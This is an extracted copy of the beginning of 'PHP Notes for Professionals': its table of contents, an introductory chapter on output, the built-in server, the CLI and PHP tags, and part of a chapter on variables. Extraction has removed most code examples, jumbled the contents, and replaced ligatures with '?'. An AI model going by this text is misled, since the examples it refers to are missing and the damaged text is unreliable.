PHP
Notes for Professionals

                                                    
Disclaimer This is an uno?cial free book created for educational purposes and is not a?liated with o?cial PHP group(s) or company(s).
All trademarks and registered trademarks are the property of their respective owners

Contents

About

.	1

Chapter 1: Getting started with PHP
Section 1.1: HTML output from web server

.	2
.	2

Section 1.2: Hello, World!	3
Section 1.3: Non-HTML output from web server	3
Section 1.4: PHP built-in server	5
Section 1.5: PHP CLI	5
Section 1.6: Instruction Separation	6

Section 1.7: PHP Tags
Chapter 2: Variables

.	7
.	9

Section 2.1: Accessing A Variable Dynamically By Name (Variable variables)	9
Section 2.2: Data Types	10
Section 2.3: Global variable best practices	13
Section 2.4: Default values of uninitialized variables	14
Section 2.5: Variable Value Truthiness and Identical Operator	15

Chapter 3: Variable Scope

.	18

Section 3.1: Superglobal variables	18

Section 3.2: Static properties and variables Section 3.3: User-de?ned global variables

.	18
.	19

Chapter 4: Superglobal Variables PHP

.	21

Section 4.1: Suberglobals explained	21
Section 4.2: PHP5 SuperGlobals	28

Chapter 5: Outputting the Value of a Variable

.	32

Section 5.1: echo and print	32
Section 5.2: Outputting a structured view of arrays and objects	33
Section 5.3: String concatenation with echo	35
Section 5.4: printf vs sprintf	36
Section 5.5: Outputting large integers	36
Section 5.6: Output a Multidimensional Array with index and value and print into the table	37

Chapter 6: Constants

.	39

Section 6.1: De?ning constants	39
Section 6.2: Class Constants	40
Section 6.3: Checking if constant is de?ned	40

Section 6.4: Using constants Section 6.5: Constant arrays

.	42
.	42

Chapter 7: Magic Constants

.	43

Section 7.1: Di?erence between	FUNCTION	and	METHOD		43
Section 7.2: Di?erence between	CLASS	, get_class() and get_called_class()	43
Section 7.3: File & Directory Constants	44

Chapter 8: Comments

.	45

Section 8.1: Single Line Comments Section 8.2: Multi Line Comments

.	45
.	45

Chapter 9: Types

.	46

Section 9.1: Type Comparison	46
Section 9.2: Boolean	46
Section 9.3: Float	47

Section 9.4: Strings Section 9.5: Callable

.	48
.	50

Section 9.6: Resources	50

Section 9.7: Type Casting Section 9.8: Type Juggling

.	51
.	51

Section 9.9: Null	52
Section 9.10: Integers	52

Chapter 10: Operators

.	54

Section 10.1: Null Coalescing Operator (??)	54
Section 10.2: Spaceship Operator (<=>)	55
Section 10.3: Execution Operator (``)	55
Section 10.4: Incrementing (++) and Decrementing Operators (--)	55
Section 10.5: Ternary Operator (?:)	56
Section 10.6: Logical Operators (&&/AND and ||/OR)	57
Section 10.7: String Operators (. and .=)	57
Section 10.8: Object and Class Operators	57
Section 10.9: Combined Assignment (+= etc)	59
Section 10.10: Altering operator precedence (with parentheses)	59
Section 10.11: Basic Assignment (=)	60
Section 10.12: Association	60
Section 10.13: Comparison Operators	60
Section 10.14: Bitwise Operators	62
Section 10.15: instanceof (type operator)	64

Chapter 11: References

.	67

Section 11.1: Assign by Reference Section 11.2: Return by Reference

.	67
.	67

Section 11.3: Pass by Reference	68

Chapter 12: Arrays

.	71

Section 12.1: Initializing an Array Section 12.2: Check if key exists

.	71
.	73

Section 12.3: Validating the array type	74
Section 12.4: Creating an array of variables	74
Section 12.5: Checking if a value exists in array	74
Section 12.6: ArrayAccess and Iterator Interfaces	75

Chapter 13: Array iteration

.	79

Section 13.1: Iterating multiple arrays together	79
Section 13.2: Using an incremental index	80
Section 13.3: Using internal array pointers	80
Section 13.4: Using foreach	81
Section 13.5: Using ArrayObject Iterator	83

Chapter 14: Executing Upon an Array

.	84

Section 14.1: Applying a function to each element of an array	84
Section 14.2: Split array into chunks	85
Section 14.3: Imploding an array into string	86
Section 14.4: "Destructuring" arrays using list()	86
Section 14.5: array_reduce	86

Section 14.6: Push a Value on an Array
Chapter 15: Manipulating an Array

.	87
.	89

Section 15.1: Filtering an array	89
Section 15.2: Removing elements from an array	90

Section 15.3: Sorting an Array	91
Section 15.4: Whitelist only some array keys	96
Section 15.5: Adding element to start of array	96
Section 15.6: Exchange values with keys	97
Section 15.7: Merge two arrays into one array	97

Chapter 16: Processing Multiple Arrays Together

.	99

Section 16.1: Array intersection	99
Section 16.2: Merge or concatenate arrays	99
Section 16.3: Changing a multidimensional array to associative array	100
Section 16.4: Combining two arrays (keys from one, values from another)	100

Chapter 17: Datetime Class

.	102

Section 17.1: Create Immutable version of DateTime from Mutable prior PHP 5.6	102
Section 17.2: Add or Subtract Date Intervals	102
Section 17.3: getTimestamp	102
Section 17.4: setDate	103
Section 17.5: Create DateTime from custom format	103
Section 17.6: Printing DateTimes	103

Chapter 18: Working with Dates and Time

.	105

Section 18.1: Getting the di?erence between two dates / times	105
Section 18.2: Convert a date into another format	105
Section 18.3: Parse English date descriptions into a Date format	107
Section 18.4: Using Prede?ned Constants for Date Format	107

Chapter 19: Control Structures

.	109

Section 19.1: if else	109
Section 19.2: Alternative syntax for control structures	109
Section 19.3: while	109
Section 19.4: do-while	110
Section 19.5: goto	110
Section 19.6: declare	110
Section 19.7: include & require	111
Section 19.8: return	112
Section 19.9: for	112
Section 19.10: foreach	113
Section 19.11: if elseif else	113
Section 19.12: if	114

Section 19.13: switch
Chapter 20: Loops

.	114
.	116

Section 20.1: continue	116
Section 20.2: break	117

Section 20.3: foreach Section 20.4: do...while

.	118
.	118

Section 20.5: for	119
Section 20.6: while	120

Chapter 21: Functions

.	121

Section 21.1: Variable-length argument lists	121
Section 21.2: Optional Parameters	122
Section 21.3: Passing Arguments by Reference	123
Section 21.4: Basic Function Usage	124
Section 21.5: Function Scope	124

Chapter 22: Functional Programming

.	125

Section 22.1: Closures	125
Section 22.2: Assignment to variables	126
Section 22.3: Objects as a function	126
Section 22.4: Using outside variables	127
Section 22.5: Anonymous function	127
Section 22.6: Pure functions	128

Section 22.7: Common functional methods in PHP Section 22.8: Using built-in functions as callbacks

.	128
.	129

Section 22.9: Scope	129
Section 22.10: Passing a callback function as a parameter	129

Chapter 23: Alternative Syntax for Control Structures

.	131

Section 23.1: Alternative if/else statement	131
Section 23.2: Alternative for statement	131
Section 23.3: Alternative while statement	131
Section 23.4: Alternative foreach statement	131
Section 23.5: Alternative switch statement	132

Chapter 24: String formatting

.	133

Section 24.1: String interpolation	133
Section 24.2: Extracting/replacing substrings	134

Chapter 25: String Parsing

.	136

Section 25.1: Splitting a string by separators	136
Section 25.2: Substring	136
Section 25.3: Searching a substring with strpos	138
Section 25.4: Parsing string using regular expressions	139

Chapter 26: Classes and Objects

.	140

Section 26.1: Class Constants Section 26.2: Abstract Classes

.	140
.	142

Section 26.3: Late static binding	144

Section 26.4: Namespacing and Autoloading Section 26.5: Method and Property Visibility

.	145
.	147

Section 26.6: Interfaces	149
Section 26.7: Final Keyword	152
Section 26.8: Autoloading	153
Section 26.9: Calling a parent constructor when instantiating a child	154
Section 26.10: Dynamic Binding	155
Section 26.11: $this, self and static plus the singleton	156
Section 26.12: De?ning a Basic Class	159
Section 26.13: Anonymous Classes	160

Chapter 27: Namespaces

.	162

Section 27.1: Declaring namespaces	162
Section 27.2: Referencing a class or function in a namespace	162
Section 27.3: Declaring sub-namespaces	163
Section 27.4: What are Namespaces?	164

Chapter 28: Sessions

.	165

Section 28.1: session_start() Options	165
Section 28.2: Session Locking	165

Section 28.3: Manipulating session data Section 28.4: Destroy an entire session

.	166
.	166

Section 28.5: Safe Session Start With no Errors	167
Section 28.6: Session name	167

Chapter 29: Cookies

.	169

Section 29.1: Modifying a Cookie	169
Section 29.2: Setting a Cookie	169
Section 29.3: Checking if a Cookie is Set	170

    Section 29.4: Removing a Cookie Section 29.5: Retrieving a Cookie Chapter 30: Output Bu?ering

.	170
.	170
.	171

Section 30.1: Basic usage getting content between bu?ers and clearing	171
Section 30.2: Processing the bu?er via a callback	171
Section 30.3: Nested output bu?ers	172
Section 30.4: Running output bu?er before any content	173
Section 30.5: Stream output to client	174
Section 30.6: Using Output bu?er to store contents in a ?le, useful for reports, invoices etc	174
Section 30.7: Typical usage and reasons for using ob_start	174
Section 30.8: Capturing the output bu?er to re-use later	175

Chapter 31: JSON

.	177

Section 31.1: Decoding a JSON string Section 31.2: Encoding a JSON string Section 31.3: Debugging JSON errors

.	177
.	180
.	183

Section 31.4: Using JsonSerializable in an Object	184
Section 31.5: Header json and the returned response	185

Chapter 32: SOAP Client
Section 32.1: WSDL Mode

.	187
.	187

Section 32.2: Non-WSDL Mode	187
Section 32.3: Classmaps	187
Section 32.4: Tracing SOAP request and response	188

Chapter 33: Using cURL in PHP

.	190

Section 33.1: Basic Usage (GET Requests)	190
Section 33.2: POST Requests	190
Section 33.3: Using Cookies	191
Section 33.4: Using multi_curl to make multiple POST requests	192
Section 33.5: Sending multi-dimensional data and multiple ?les with CurlFile in one request	193
Section 33.6: Creating and sending a request with a custom method	196
Section 33.7: Get and Set custom http headers in php	196

Chapter 34: Re?ection

.	198

Section 34.1: Feature detection of classes or objects	198
Section 34.2: Testing private/protected methods	198
Section 34.3: Accessing private and protected member variables	200

Chapter 35: Dependency Injection

.	202

Section 35.1: Constructor Injection	202
Section 35.2: Setter Injection	202
Section 35.3: Container Injection	204

Chapter 36: XML

.	205

Section 36.1: Create a XML using DomDocument	205
Section 36.2: Read a XML document with DOMDocument	206
Section 36.3: Leveraging XML with PHP's SimpleXML Library	207
Section 36.4: Create an XML ?le using XMLWriter	209

Section 36.5: Read a XML document with SimpleXML	210

Chapter 37: SimpleXML

.	212

Section 37.1: Loading XML data into simplexml	212

Chapter 38: Parsing HTML

.	213

Section 38.1: Parsing HTML from a string	213
Section 38.2: Using XPath	213
Section 38.3: SimpleXML	213

Chapter 39: Regular Expressions (regexp/PCRE)

.	215

Section 39.1: Global RegExp match	215
Section 39.2: String matching with regular expressions	216
Section 39.3: Split string into array by a regular expression	217
Section 39.4: String replacing with regular expression	217
Section 39.5: String replace with callback	217

Chapter 40: Traits

.	219

Section 40.1: What is a Trait?	219
Section 40.2: Traits to facilitate horizontal code reuse	220
Section 40.3: Con?ict Resolution	221
Section 40.4: Implementing a Singleton using Traits	222
Section 40.5: Traits to keep classes clean	223
Section 40.6: Multiple Traits Usage	224
Section 40.7: Changing Method Visibility	224

Chapter 41: Composer Dependency Manager

.	226

Section 41.1: What is Composer?	226
Section 41.2: Autoloading with Composer	227
Section 41.3: Di?erence between 'composer install' and 'composer update'	227
Section 41.4: Composer Available Commands	228
Section 41.5: Bene?ts of Using Composer	229
Section 41.6: Installation	230

Chapter 42: Magic Methods

.	231

Section 42.1:	call() and	callStatic()	231
Section 42.2:	get(),	set(),	isset() and	unset()	232
Section 42.3:	construct() and	destruct()	233
Section 42.4:	toString()	234

Section 42.5:	 clone() Section 42.6:	invoke()

.	235
.	235

Section 42.7:	sleep() and	wakeup()	236

Section 42.8:	debugInfo()
Chapter 43: File handling

.	236
.	238

Section 43.1: Convenience functions	238
Section 43.2: Deleting ?les and directories	240
Section 43.3: Getting ?le information	240
Section 43.4: Stream-based ?le IO	242
Section 43.5: Moving and Copying ?les and directories	244
Section 43.6: Minimize memory usage when dealing with large ?les	245

Chapter 44: Streams

.	246

Section 44.1: Registering a stream wrapper	246

Chapter 45: Type hinting

.	248

Section 45.1: Type hinting classes and interfaces	248
Section 45.2: Type hinting scalar types, arrays and callables	249

Section 45.3: Nullable type hints	250
Section 45.4: Type hinting generic objects	251

Section 45.5: Type Hinting No Return(Void)
Chapter 46: Filters & Filter Functions

.	252
.	253

Section 46.1: Validating Boolean Values	253
Section 46.2: Validating A Number Is A Float	253

Section 46.3: Validate A MAC Address Section 46.4: Sanitze Email Addresses

.	254
.	254

Section 46.5: Sanitize Integers	255
Section 46.6: Sanitize URLs	255
Section 46.7: Validate Email Address	256
Section 46.8: Validating A Value Is An Integer	256
Section 46.9: Validating An Integer Falls In A Range	257

Section 46.10: Validate a URL Section 46.11: Sanitize Floats

.	257
.	259

Section 46.12: Validate IP Addresses	261
Section 46.13: Sanitize ?lters	262

Chapter 47: Generators

.	263

Section 47.1: The Yield Keyword	263
Section 47.2: Reading a large ?le with a generator	264
Section 47.3: Why use a generator?	264
Section 47.4: Using the send()-function to pass values to a generator	265

Chapter 48: UTF-8

.	267

Section 48.1: Input	267
Section 48.2: Output	267
Section 48.3: Data Storage and Access	267

Chapter 49: Unicode Support in PHP

.	269

Section 49.1: Converting Unicode characters to "\uxxxx" format using PHP	269
Section 49.2: Converting Unicode characters to their numeric value and/or HTML entities using PHP
.	269
Section 49.3: Intl extention for Unicode support	271

Chapter 50: URLs

.	272

Section 50.1: Parsing a URL	272
Section 50.2: Build an URL-encoded query string from an array	272
Section 50.3: Redirecting to another URL	273

Chapter 51: How to break down an URL

.	275

Section 51.1: Using parse_url() Section 51.2: Using explode()

.	275
.	276

Section 51.3: Using basename()	276

Chapter 52: Object Serialization

.	278

Section 52.1: Serialize / Unserialize	278
Section 52.2: The Serializable interface	278

Chapter 53: Serialization

.	280

Section 53.1: Serialization of di?erent types Section 53.2: Security Issues with unserialize

.	280
.	281

Chapter 54: Closure

.	284

Section 54.1: Basic usage of a closure Section 54.2: Using external variables

.	284
.	284

Section 54.3: Basic closure binding	285

Section 54.4: Closure binding and scope	285
Section 54.5: Binding a closure for one call	287
Section 54.6: Use closures to implement observer pattern	287

Chapter 55: Reading Request Data

.	290

Section 55.1: Reading raw POST data	290
Section 55.2: Reading POST data	290
Section 55.3: Reading GET data	290
Section 55.4: Handling ?le upload errors	291
Section 55.5: Passing arrays by POST	291
Section 55.6: Uploading ?les with HTTP PUT	293

Chapter 56: Type juggling and Non-Strict Comparison Issues

.	294

Section 56.1: What is Type Juggling?	294
Section 56.2: Reading from a ?le	294
Section 56.3: Switch surprises	295
Section 56.4: Strict typing	296

Chapter 57: Sockets

.	298

Section 57.1: TCP client socket	298

Section 57.2: TCP server socket Section 57.3: UDP server socket

.	299
.	299

Section 57.4: Handling socket errors	300

Chapter 58: PDO

.	301

Section 58.1: Preventing SQL injection with Parameterized Queries	301
Section 58.2: Basic PDO Connection and Retrieval	302
Section 58.3: Database Transactions with PDO	303
Section 58.4: PDO: connecting to MySQL/MariaDB server	305
Section 58.5: PDO: Get number of a?ected rows by a query	306
Section 58.6: PDO::lastInsertId()	306

Chapter 59: PHP MySQLi

.	308

Section 59.1: Close connection Section 59.2: MySQLi connect

.	308
.	308

Section 59.3: Loop through MySQLi results	309
Section 59.4: Prepared statements in MySQLi	309
Section 59.5: Escaping Strings	310
Section 59.6: Debugging SQL in MySQLi	311
Section 59.7: MySQLi query	311
Section 59.8: How to get data from a prepared statement	312
Section 59.9: MySQLi Insert ID	314

Chapter 60: SQLite3

.	316

Section 60.1: SQLite3 Quickstart Tutorial	316
Section 60.2: Querying a database	317
Section 60.3: Retrieving only one result	318

Chapter 61: Using MongoDB

.	319

Section 61.1: Connect to MongoDB	319
Section 61.2: Get multiple documents - ?nd()	319
Section 61.3: Get one document - ?ndOne()	319
Section 61.4: Insert document	319

Section 61.5: Update a document Section 61.6: Delete a document

.	319
.	320

Chapter 62: mongo-php

.	321

Section 62.1: Everything in between MongoDB and Php	321

Chapter 63: Using Redis with PHP

.	324

Section 63.1: Connecting to a Redis instance Section 63.2: Installing PHP Redis on Ubuntu

.	324
.	324

Section 63.3: Executing Redis commands in PHP	324

Chapter 64: Sending Email

.	325

Section 64.1: Sending Email - The basics, more details, and a full example	325
Section 64.2: Sending HTML Email Using mail()	327
Section 64.3: Sending Email With An Attachment Using mail()	328
Section 64.4: Sending Plain Text Email Using PHPMailer	329
Section 64.5: Sending HTML Email Using PHPMailer	330
Section 64.6: Sending Email With An Attachment Using PHPMailer	331
Section 64.7: Sending Plain Text Email Using Sendgrid	331
Section 64.8: Sending Email With An Attachment Using Sendgrid	332

Chapter 65: Using SQLSRV

.	333

Section 65.1: Retrieving Error Messages	333

Section 65.2: Fetching Query Results Section 65.3: Creating a Connection Section 65.4: Making a Simple Query

.	333
.	334
.	334

Section 65.5: Invoking a Stored Procedure	334
Section 65.6: Making a Parameterised Query	335

Chapter 66: Command Line Interface (CLI)

.	336

Section 66.1: Handling Program Options	336
Section 66.2: Argument Handling	337
Section 66.3: Input and Output Handling	338
Section 66.4: Return Codes	339
Section 66.5: Restrict script execution to command line	339
Section 66.6: Behavioural di?erences on the command line	339
Section 66.7: Running your script	340
Section 66.8: Edge Cases of getopt()	340
Section 66.9: Running built-in web server	341

Chapter 67: Localization

.	343

Section 67.1: Localizing strings with gettext()	343

Chapter 68: Headers Manipulation
Section 68.1: Basic Setting of a Header

.	344
.	344

Chapter 69: Coding Conventions

.	345

Section 69.1: PHP Tags	345

Chapter 70: Asynchronous programming

.	346

Section 70.1: Advantages of Generators	346
Section 70.2: Using Icicle event loop	346
Section 70.3: Spawning non-blocking processes with proc_open()	347

Section 70.4: Reading serial port with Event and DIO Section 70.5: HTTP Client Based on Event Extension

.	348
.	350

Section 70.6: HTTP Client Based on Ev Extension	353
Section 70.7: Using Amp event loop	357

Chapter 71: How to Detect Client IP Address

.	359

Section 71.1: Proper use of HTTP_X_FORWARDED_FOR	359

Chapter 72: Create PDF ?les in PHP
Section 72.1: Getting Started with PDFlib

.	361
.	361

Chapter 73: YAML in PHP

.	362

Section 73.1: Installing YAML extension	362
Section 73.2: Using YAML to store application con?guration	362

Chapter 74: Image Processing with GD

.	364

Section 74.1: Image output	364
Section 74.2: Creating an image	365
Section 74.3: Image Cropping and Resizing	366

Chapter 75: Imagick

.	369

Section 75.1: First Steps	369
Section 75.2: Convert Image into base64 String	369

Chapter 76: SOAP Server

.	371

Section 76.1: Basic SOAP Server	371

Chapter 77: Machine learning

.	372

Section 77.1: Classi?cation using PHP-ML	372

Section 77.2: Regression Section 77.3: Clustering

.	373
.	375

Chapter 78: Cache

.	377

Section 78.1: Caching using memcache Section 78.2: Cache Using APC Cache

.	377
.	378

Chapter 79: Autoloading Primer

.	380

Section 79.1: Autoloading as part of a framework solution	380
Section 79.2: Inline class de?nition, no loading required	380
Section 79.3: Manual class loading with require	381
Section 79.4: Autoloading replaces manual class de?nition loading	381
Section 79.5: Autoloading with Composer	382

Chapter 80: SPL data structures

.	383

Section 80.1: SplFixedArray	383

Chapter 81: IMAP

.	387

Section 81.1: Connecting to a mailbox	387
Section 81.2: Install IMAP extension	388
Section 81.3: List all folders in the mailbox	388
Section 81.4: Finding messages in the mailbox	389

Chapter 82: HTTP Authentication

.	391

Section 82.1: Simple authenticate	391

Chapter 83: WebSockets

.	392

Section 83.1: Simple TCP/IP server	392

Chapter 84: BC Math (Binary Calculator)

.	394

Section 84.1: Using bcmath to read/write a binary long on 32-bit system	394
Section 84.2: Comparison between BCMath and ?oat arithmetic operations	395

Chapter 85: Docker deployment

.	397

Section 85.1: Get docker image for php	397
Section 85.2: Writing docker?le	397
Section 85.3: Building image	397
Section 85.4: Starting application container	398

Chapter 86: APCu

.	399

Section 86.1: Iterating over Entries	399
Section 86.2: Simple storage and retrieval	399
Section 86.3: Store information	399

Chapter 87: PHP Built in server

.	400

Section 87.1: Running the built in server	400
Section 87.2: built in server with speci?c directory and router script	400

Chapter 88: PSR

.	401

Section 88.1: PSR-4: Autoloader	401
Section 88.2: PSR-1: Basic Coding Standard	402

Chapter 89: PHPDoc

.	403

Section 89.1: Describing a variable	403
Section 89.2: Adding metadata to functions	403
Section 89.3: Describing parameters	404
Section 89.4: Collections	405
Section 89.5: Adding metadata to ?les	406
Section 89.6: Inheriting metadata from parent structures	406

Chapter 90: Design Patterns

.	408

Section 90.1: Method Chaining in PHP	408

Chapter 91: Compile PHP Extensions

.	410

Section 91.1: Compiling on Linux
Chapter 92: Common Errors

.	410
.	411

Section 92.1: Call fetch_assoc on boolean	411
Section 92.2: Unexpected $end	411

Chapter 93: Compilation of Errors and Warnings

.	413

Section 93.1: Parse error: syntax error, unexpected T_PAAMAYIM_NEKUDOTAYIM	413
Section 93.2: Notice: Unde?ned index	413
Section 93.3: Warning: Cannot modify header information - headers already sent	413

Chapter 94: Exception Handling and Error Reporting
Section 94.1: Setting error reporting and where to display them

.	415
.	415

Section 94.2: Logging fatal errors	415

Chapter 95: Debugging

.	417

Section 95.1: Dumping variables Section 95.2: Displaying errors

.	417
.	417

Section 95.3: phpinfo()	418
Section 95.4: Xdebug	418
Section 95.5: Error Reporting (use them both)	419

Section 95.6: phpversion()
Chapter 96: Unit Testing

.	419
.	420

Section 96.1: Testing class rules	420
Section 96.2: PHPUnit Data Providers	423

Section 96.3: Test exceptions
Chapter 97: Performance

.	426
.	428

Section 97.1: Pro?ling with Xdebug	428
Section 97.2: Memory Usage	429
Section 97.3: Pro?ling with XHProf	430

Chapter 98: Multiprocessing

.	432

Section 98.1: Multiprocessing using built-in fork functions	432
Section 98.2: Creating child process using fork	432

Section 98.3: Inter-Process Communication
Chapter 99: Multi Threading Extension

.	433
.	434

Section 99.1: Getting Started	434

Section 99.2: Using Pools and Workers
Chapter 100: Secure Remeber Me

.	434
.	436

Section 100.1: "Keep Me Logged In" - the best approach	436

Chapter 101: Security

.	437

Section 101.1: PHP Version Leakage	437
Section 101.2: Cross-Site Scripting (XSS)	437
Section 101.3: Cross-Site Request Forgery	439
Section 101.4: Command Line Injection	440
Section 101.5: Stripping Tags	441
Section 101.6: File Inclusion	442

Section 101.7: Error Reporting Section 101.8: Uploading ?les

.	442
.	443

Chapter 102: Cryptography

.	446

Section 102.1: Symmetric Encryption and Decryption of large Files with OpenSSL	446
Section 102.2: Symmetric Cipher	448

Chapter 103: Password Hashing Functions

.	449

Section 103.1: Creating a password hash	449
Section 103.2: Determine if an existing password hash can be upgraded to a stronger algorithm	450
Section 103.3: Verifying a password against a hash	451

Chapter 104: Contributing to the PHP Manual

.	452

    Section 104.1: Improve the o?cial documentation Section 104.2: Tips for contributing to the manual Chapter 105: Contributing to the PHP Core

.	452
.	452
.	453

Section 105.1: Setting up a basic development environment	453

Appendix A: Installing a PHP environment on Windows

.	454

Section A.1: Download, Install and use WAMP	454

Section A.2: Install PHP and use it with IIS Section A.3: Download and Install XAMPP

.	454
.	455

Appendix B: Installing on Linux/Unix Environments

.	458

Section B.1: Command Line Install Using APT for PHP 7	458
Section B.2: Installing in Enterprise Linux distributions (CentOS, Scienti?c Linux, etc)	458

Credits

.	460

You may also like

.	468

About








Chapter 1: Getting started with PHP
PHP 7.x
Version Supported Until Release Date
7.1	2019-12-01	2016-12-01
7.0	2018-12-03	2015-12-03
PHP 5.x
Version Supported Until Release Date
5.6	2018-12-31	2014-08-28
5.5	2016-07-21	2013-06-20
5.4	2015-09-03	2012-03-01
5.3	2014-08-14	2009-06-30
5.2	2011-01-06	2006-11-02
5.1	2006-08-24	2005-11-24
5.0	2005-09-05	2004-07-13
PHP 4.x
Version Supported Until Release Date
4.4	2008-08-07	2005-07-11
4.3	2005-03-31	2002-12-27
4.2	2002-09-06	2002-04-22
4.1	2002-03-12	2001-12-10
4.0	2001-06-23	2000-05-22
Legacy Versions
Version Supported Until Release Date
3.0
2000-10-20
1998-06-06
2.0

1997-11-01
1.0

1995-06-08
Section 1.1: HTML output from web server
PHP can be used to add content to HTML ?les. While HTML is processed directly by a web browser, PHP scripts are executed by a web server and the resulting HTML is sent to the browser.
The following HTML markup contains a PHP statement that will add Hello World! to the output:


When this is saved as a PHP script and executed by a web server, the following HTML will be sent to the user's browser:



PHP 5.x Version = 5.4

echo also has a shortcut syntax, which lets you immediately print a value. Prior to PHP 5.4.0, this short syntax only works with the short_open_tag con?guration setting enabled.

For example, consider the following code:


Its output is identical to the output of the following:


In real-world applications, all data output by PHP to an HTML page should be properly escaped to prevent XSS (Cross-site scripting) attacks or text corruption.

See also: Strings and PSR-1, which describes best practices, including the proper use of short tags (<?= ... ?>).
Section 1.2: Hello, World!
The most widely used language construct to print output in PHP is echo:


Alternatively, you can also use print:


Both statements perform the same function, with minor di?erences:

echo has a void return, whereas print returns an int with a value of 1
echo can take multiple arguments (without parentheses only), whereas print only takes one argument
echo is slightly faster than print

Both echo and print are language constructs, not functions. That means they do not require parentheses around their arguments. For cosmetic consistency with functions, parentheses can be included. Extensive examples of the use of echo and print are available elsewhere.
C-style printf and related functions are available as well, as in the following example:


See Outputting the value of a variable for a comprehensive introduction of outputting variables in PHP.

Section 1.3: Non-HTML output from web server
In some cases, when working with a web server, overriding the web server's default content type may be required. There may be cases where you need to send data as plain text, JSON, or XML, for example.

The header() function can send a raw HTTP header. You can add the Content-Type header to notify the browser of the content we are sending.

Consider the following code, where we set Content-Type as text/plain:


This will produce a plain text document with the following content:

Hello World


To produce JSON content, use the application/json content type instead:


This will produce a document of type application/json with the following content:

{"response":"Hello World"}


Note that the header() function must be called before PHP produces any output, or the web server will have already sent headers for the response. So, consider the following code:


This will produce a warning:

Warning: Cannot modify header information - headers already sent by (output started at
/dir/example.php:2) in /dir/example.php on line 3


When using header(), its output needs to be the ?rst byte that's sent from the server. For this reason it's important to not have empty lines or spaces in the beginning of the ?le before the PHP opening tag <?php. For the same reason, it is considered best practice (see PSR-2) to omit the PHP closing tag ?> from ?les that contain only PHP and from blocks of PHP code at the very end of a ?le.

View the output bu?ering section to learn how to 'catch' your content into a variable to output later, for example, after outputting headers.

Section 1.4: PHP built-in server
PHP 5.4+ comes with a built-in development server. It can be used to run applications without having to install a production HTTP server such as nginx or Apache. The built-in server is only designed to be used for development and testing purposes.
It can be started by using the -S ?ag:

Example usage

1. Create an index.php ?le containing:


2. Run the command php -S localhost:8080 from the command line. Do not include
http://

. This will start a web server listening on port 8080 using the current directory that you are in as the document root.
3. Open the browser and navigate to http://localhost:8080. You should see your "Hello World" page.

Con?guration

To override the default document root (i.e. the current directory), use the -t ?ag:


E.g. if you have a public/ directory in your project you can serve your project from that directory using php -S localhost:8080 -t public/.

Logs

Every time a request is made from the development server, a log entry like the one below is written to the command line.


Section 1.5: PHP CLI
PHP can also be run from command line directly using the CLI (Command Line Interface).

CLI is basically the same as PHP from web servers, except some di?erences in terms of standard input and output.

Triggering

The PHP CLI allows four ways to run PHP code:

1. Standard input. Run the php command without any arguments, but pipe PHP code into it: echo '<?php echo "Hello world!";' | php
2. Filename as argument. Run the php command with the name of a PHP source ?le as the ?rst argument: php hello_world.php

3. Code as argument. Use the -r option in the php command, followed by the code to run. The <?php open tags are not required, as everything in the argument is considered as PHP code: php -r 'echo "Hello world!";'
4. Interactive shell. Use the -a option in the php command to launch an interactive shell. Then, type (or paste)

PHP code and hit

Output

: $ php -a Interactive mode enabled php > echo "Hello world!"; Hello world!


All functions or controls that produce HTML output in web server PHP can be used to produce output in the stdout stream (?le descriptor 1), and all actions that produce output in error logs in web server PHP will produce output in the stderr stream (?le descriptor 2).

Example.php

Shell command line
Input

See: Command Line Interface (CLI)

Section 1.6: Instruction Separation
Just like most other C-style languages, each statement is terminated with a semicolon. Also, a closing tag is used to terminate the last line of code of the PHP block.
If the last line of PHP code ends with a semicolon, the closing tag is optional if there is no code following that ?nal line of code. For example, we can leave out the closing tag after echo "No error"; in the following example:


However, if there is any other code following your PHP code block, the closing tag is no longer optional:




We can also leave out the semicolon of the last statement in a PHP code block if that code block has a closing tag:


It is generally recommended to always use a semicolon and use a closing tag for every PHP code block except the last PHP code block, if no more code follows that PHP code block.
So, your code should basically look like this:


Section 1.7: PHP Tags
There are three kinds of tags to denote PHP blocks in a ?le. The PHP parser is looking for the opening and (if present) closing tags to delimit the code to interpret.
Standard Tags

These tags are the standard method to embed PHP code in a ?le.

PHP 5.x Version = 5.4
Echo Tags

These tags are available in all PHP versions, and since PHP 5.4 are always enabled. In previous versions, echo tags could only be enabled in conjunction with short tags.

Short Tags

You can disable or enable these tags with the option short_open_tag.



Short tags:

are disallowed in all major PHP coding standards are discouraged in the o?cial documentation are disabled by default in most distributions
interfere with inline XML's processing instructions
are not accepted in code submissions by most open source projects

PHP 5.x Version = 5.6
ASP Tags

By enabling the asp_tags option, ASP-style tags can be used.


These are an historic quirk and should never be used. They were removed in PHP 7.0.

Chapter 2: Variables
Section 2.1: Accessing A Variable Dynamically By Name (Variable variables)
Variables can be accessed via dynamic variable names. The name of a variable can be stored in another variable, allowing it to be accessed dynamically. Such variables are known as variable variables.
To turn a variable into a variable variable, you put an extra $ put in front of your variable.


Variable variables are useful for mapping function/method calls:


This becomes particularly helpful in PHP classes:


It is possible, but not required to put $variableName between {}:


The following examples are both equivalent and output "baz":




Using {} is only mandatory when the name of the variable is itself an expression, like this:


It is nevertheless recommended to always use {}, because it's more readable. While it is not recommended to do so, it is possible to chain this behavior:


It's important to note that the excessive usage of variable variables is considered a bad practice by many developers. Since they're not well-suited for static analysis by modern IDEs, large codebases with many variable variables (or dynamic method invocations) can quickly become di?cult to maintain.



Di?erences between PHP5 and PHP7

Another reason to always use {} or (), is that PHP5 and PHP7 have a slightly di?erent way of dealing with dynamic variables, which results in a di?erent outcome in some cases.

In PHP7, dynamic variables, properties, and methods will now be evaluated strictly in left-to-right order, as opposed to the mix of special cases in PHP5. The examples below show how the order of evaluation has changed.
Case 1 : $$foo['bar']['baz']
PHP5 interpretation : ${$foo['bar']['baz']}
PHP7 interpretation : ($$foo)['bar']['baz']
Case 2 : $foo->$bar['baz']
PHP5 interpretation : $foo->{$bar['baz']}
PHP7 interpretation : ($foo->$bar)['baz']
Case 3 : $foo->$bar['baz']()
PHP5 interpretation : $foo->{$bar['baz']}()
PHP7 interpretation : ($foo->$bar)['baz']()
Case 4 : Foo::$bar['baz']()
PHP5 interpretation : Foo::{$bar['baz']}()
PHP7 interpretation : (Foo::$bar)['baz']()
Section 2.2: Data Types
There are di?erent data types for di?erent purposes. PHP does not have explicit type de?nitions, but the type of a variable is determined by the type of the value that is assigned, or by the type that it is casted to. This is a brief overview about the types, for a detailed documentation and examples, see the PHP types topic.
There are following data types in PHP: null, boolean, integer, ?oat, string, object, resource and array.

Null

Null can be assigned to any variable. It represents a variable with no value.


